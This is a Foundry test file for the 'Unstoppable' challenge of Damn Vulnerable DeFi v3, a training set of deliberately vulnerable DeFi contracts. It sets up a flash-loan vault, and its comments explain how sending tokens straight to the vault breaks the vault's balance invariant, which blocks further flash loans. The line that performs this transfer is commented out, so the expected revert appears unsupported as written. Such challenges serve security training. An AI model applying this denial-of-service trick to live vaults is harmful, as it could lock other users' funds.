pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utilities} from "./utils/Utilities.sol";
import "dvd-v3/DamnValuableToken.sol";
import "dvd-v3/unstoppable/UnstoppableVault.sol";
import "dvd-v3/unstoppable/ReceiverUnstoppable.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    address internal deployer;
    address internal attacker;
    address internal someUser;

    Utilities internal utils;

    DamnValuableToken internal dvt;
    UnstoppableVault internal usv;
    ReceiverUnstoppable internal rus;

    function setUp() public {
        utils = new Utilities();
	address [] memory actors = utils.setUp(["Deployer", "Attacker", "SomeUser"], [10e18, 1e18, 5e18]);
        deployer = actors[0];
        attacker = actors[1];
        someUser = actors[2];


        vm.startPrank(deployer);

        dvt = new DamnValuableToken();

	utils.stats_erc20(address(dvt), actors, ["Deployer", "Attacker", "SomeUser"]);

        usv = new UnstoppableVault(dvt, address(deployer), address(deployer));

        // check that usv.asset() is equal to address(dvt)

        dvt.approve(address(usv), TOKENS_IN_VAULT);
        usv.deposit(TOKENS_IN_VAULT, address(deployer));

        dvt.transfer(address(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);
        vm.stopPrank();

        vm.startPrank(someUser);
        rus = new ReceiverUnstoppable(address(usv));
        rus.executeFlashLoan(10);
        vm.stopPrank();

	utils.stats(deployer, "Deployer");
    }

    function testRecon() public {

    }

    function testExploit() public {
        vm.startPrank(attacker);
        // crux of the problem is breaking invariant such that convertToShares(totalSupply) != balanceBefore
        // => balanceBefore = totalAssets()
        // => totalAssets() = assset.balanceOf(address(this))
        // => convertToShares(totalSupply) = tS == 0 ? tS : tS.MulDivDown(totalAssets(), tS)
        // dvt.transfer(address(usv), INITIAL_ATTACKER_TOKEN_BALANCE);
        vm.stopPrank();
        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        validation();
    }

    function validation() public {
        vm.startPrank(someUser);
        rus.executeFlashLoan(10);
        vm.stopPrank();
    }
}
